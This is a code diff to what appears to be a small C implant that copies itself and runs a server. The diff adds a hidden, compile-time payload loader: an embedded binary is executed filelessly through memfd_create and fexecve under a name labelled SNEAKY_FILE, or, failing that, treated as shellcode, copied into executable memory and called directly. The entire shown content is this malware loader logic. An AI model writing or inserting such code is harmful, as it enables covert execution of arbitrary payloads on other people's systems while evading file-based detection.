@@ -54,6 +54,14 @@ void	duplicate(char *path, char *target)
 	close(src_fd);
 }
 
+#ifdef PAYLOAD
+	extern char		*_binary___payload_start;
+	extern char		*_binary___payload_end;
+	extern void		*_binary___payload_size;
+#endif
+
+#include <errno.h>
+
 int		main(void)
 {
 	char path[MAX_PATH_SIZE];
@@ -83,6 +91,35 @@ int		main(void)
 		}
 	}
 	else
+	{
+#ifdef PAYLOAD
+		void (*entrypoint)();
+		size_t size = (size_t)&_binary___payload_size;
+		if (!memcmp(&_binary___payload_start, "\x7f\x45\x4c\x46", 4) ||
+		!memcmp(&_binary___payload_start, "#!/", 3)) // elf file or interpretable
+		{
+			int fd = memfd_create(SNEAKY_FILE, 0);
+			write(fd, &_binary___payload_start, size);
+			char *argv[] = {SNEAKY_FILE, NULL};
+			char *envv[] = {NULL};
+
+			fexecve(fd, argv, envv);
+			close(fd);
+			printf("end\n");
+		}
+		else // Assume it's a shellcode
+		{
+			void *addr = mmap(NULL, size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0);
+			if (!addr)
+				return (EXIT_SUCCESS);
+			memcpy(addr, &_binary___payload_start, size);
+			entrypoint = addr;
+			entrypoint();
+			munmap(addr, size);
+		}
+#else
 		server();
+#endif
+	}
 	return (EXIT_SUCCESS);
 }
